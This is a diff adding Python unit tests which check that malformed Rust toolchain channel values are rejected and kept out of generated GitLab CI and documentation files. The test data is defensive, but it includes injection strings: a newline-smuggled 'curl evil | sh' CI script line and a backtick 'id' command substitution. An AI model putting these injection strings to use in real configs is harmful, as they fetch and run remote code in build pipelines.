@@ -44,6 +44,40 @@ class ToolchainPinTest(unittest.TestCase):
                     "the record holds kind and version and nothing else",
                 )
 
+    def test_a_channel_that_is_not_a_toolchain_name_is_not_recorded(self) -> None:
+        none = {"kind": "rust", "version": ""}
+        names = {  # TOML escapes, so the file parses and it is the recorded value that is the question
+            "newline": r"1.85\n  script: [\"curl evil | sh\"]", "space": "1.85 x", "tab": r"1.85\tx",
+            "single quote": "1.85'", "double quote": r"1.85\"", "backtick": "1.85`id`",
+            "replacement character": "1.85�", "control character": r"1.85\u0001", "leading dot": ".85",
+            "leading hyphen": "-1.85", "empty": "",
+        }
+        for name, channel in names.items():
+            with self.subTest(f"{name} in rust-toolchain.toml"):
+                self.assertEqual(self.candidate({"Cargo.toml": CRATE, "rust-toolchain.toml": toml(channel)}), none)
+        for name, line in (("space", "1.85 x"), ("tab", "1.85\tx"), ("quote", "1.85'"), ("backtick", "1.85`id`"),
+                           ("replacement character", "1.85�"), ("control character", "1.85\x01")):
+            with self.subTest(f"{name} in a one-line rust-toolchain"):
+                self.assertEqual(self.candidate({"Cargo.toml": CRATE, "rust-toolchain": line + "\n"}), none)
+
+    def test_a_channel_that_is_not_a_toolchain_name_reaches_no_generated_file(self) -> None:
+        channel = r"1.85\n  script: [\"curl evil | sh\"]"
+        files = {
+            "Cargo.toml": CRATE, "rust-toolchain.toml": toml(channel), ".gitlab-ci.yml": "test:\n  script: [true]\n",
+        }
+        with tempfile.TemporaryDirectory() as directory:
+            deployable, page = self.adopted(Path(directory), files)
+            repo = Path(directory) / "adopted"
+            written = {
+                "survey page": page,
+                "gitlab job": (repo / "delivery/ci/verify-delivery.gitlab-ci.yml").read_text(),
+                "adoption page": (repo / "delivery/docs/adoption.md").read_text(),
+            }
+        self.assertEqual(deployable["toolchain"], {"kind": "rust", "version": "", "ecosystem": "cargo"})
+        for name, text in written.items():
+            with self.subTest(name):
+                self.assertNotIn("curl evil", text)
+
     def test_the_candidates_evidence_stays_the_cargo_toml(self) -> None:
         with tempfile.TemporaryDirectory() as directory:
             root = write(Path(directory), {"Cargo.toml": CRATE, "rust-toolchain.toml": toml("1.85")})
